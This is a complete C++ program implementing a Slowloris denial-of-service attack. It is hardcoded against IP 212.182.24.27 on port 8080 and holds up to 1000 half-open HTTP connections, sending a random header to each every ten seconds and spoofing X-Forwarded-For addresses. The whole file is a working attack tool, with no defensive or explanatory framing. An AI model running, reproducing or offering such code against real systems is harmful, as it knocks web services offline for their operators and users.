#include <cstring>
#include <iostream>
#include <arpa/inet.h>
#include <unistd.h>
#include <netdb.h>
#include <vector>
#include <string>
#include <ctime>
#include <random>
#include <chrono>
#include <thread>
#include <algorithm>
#include <signal.h>

using namespace std;

volatile bool running = true;
vector<int> openSockets;

void signalHandler(int signal) {
    cout << "\nShutting down Slowloris attack..." << endl;
    running = false;
}

int createSocket(const string& host, const int port) {
    const int clientSocket = socket(AF_INET, SOCK_STREAM, 0);
    if (clientSocket < 0) {
        return 1;
    }

    constexpr int flags = 1;
    if (setsockopt(clientSocket, SOL_SOCKET, SO_REUSEADDR, &flags, sizeof(int)) < 0) {
        close(clientSocket);

        return 1;
    }

    sockaddr_in serverAddr = {};
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(port);
    serverAddr.sin_addr.s_addr = inet_addr(host.c_str());

    if (connect(clientSocket, reinterpret_cast<const sockaddr*>(&serverAddr), sizeof(serverAddr)) < 0) {
        if (errno != EINPROGRESS) {
            close(clientSocket);

            return 1;
        }
    }

    return clientSocket;
}

int main() {
    signal(SIGINT, signalHandler);

    const string targetIp = "212.182.24.27";
    constexpr int targetPort = 8080;
    constexpr int maxConnections = 1000;
    constexpr int connectionDelayMs = 100;
    constexpr int keepAliveDelayMs = 10000;

    const vector<string> httpHeaders = {
        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Accept-language: en-US,en,q=0.9",
        "Accept-encoding: gzip, deflate, br",
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Cache-Control: no-cache",
        "Pragma: no-cache",
        "X-Forwarded-For: " + to_string(rand() % 256) + "." + to_string(rand() % 256) + "." + to_string(rand() % 256) + "." + to_string(rand() % 256),
        "Cookie: session=randomvalue" + to_string(rand()),
        "Connection: keep-alive",
        "Keep-Alive: 300",
        "Content-Length: " + to_string(rand() % 10000 + 10000)
    };

    cout << "Starting Slowloris attack against " << targetIp << ":" << targetPort << endl;
    cout << "Press Ctrl+C to stop the attack" << endl;

    random_device rd;
    mt19937 gen(rd());
    uniform_int_distribution<> dist(0, httpHeaders.size() - 1);

    int successfulConnections = 0;
    int failedConnections = 0;
    auto lastStatusTime = chrono::steady_clock::now();
    auto lastKeepAliveTime = chrono::steady_clock::now();

    while (running) {
        if (openSockets.size() < maxConnections) {
            if (const int newClientSocket = createSocket(targetIp, targetPort); newClientSocket >= 0) {
                const string initialRequest = "GET / HTTP/1.1\r\n"
                                        "Host: " + targetIp + ":" + to_string(targetPort) + "\r\n";

                if (send(newClientSocket, initialRequest.c_str(), initialRequest.length(), 0) > 0) {
                    openSockets.push_back(newClientSocket);
                    successfulConnections++;
                } else {
                    close(newClientSocket);
                    failedConnections++;
                }
            } else {
                failedConnections++;
            }

            this_thread::sleep_for(chrono::milliseconds(connectionDelayMs));
        }

        const auto currentTime = chrono::steady_clock::now();
        if (chrono::duration_cast<chrono::milliseconds>(currentTime - lastKeepAliveTime).count() > keepAliveDelayMs) {
            for (auto it = openSockets.begin(); it != openSockets.end();) {
                const string header = httpHeaders[dist(gen)] + "\r\n";

                if (send(*it, header.c_str(), header.length(), 0) <= 0) {
                    close(*it);

                    it = openSockets.erase(it);
                    failedConnections++;
                } else {
                    ++it;
                }
            }

            lastKeepAliveTime = currentTime;
        }

        if (chrono::duration_cast<chrono::seconds>(currentTime - lastStatusTime).count() > 5) {
            cout << "Status: " << openSockets.size() << " connections active, "
                 << successfulConnections << " successful, "
                 << failedConnections << " failed" << endl;
            lastStatusTime = currentTime;
        }

        this_thread::sleep_for(chrono::milliseconds(100));
    }

    for (const int clientSocket : openSockets) {
        close(clientSocket);
    }

    cout << "Attack stopped. Final stats: " << successfulConnections << " successful connections, "
         << failedConnections << " failed connections." << endl;

    return 0;
}
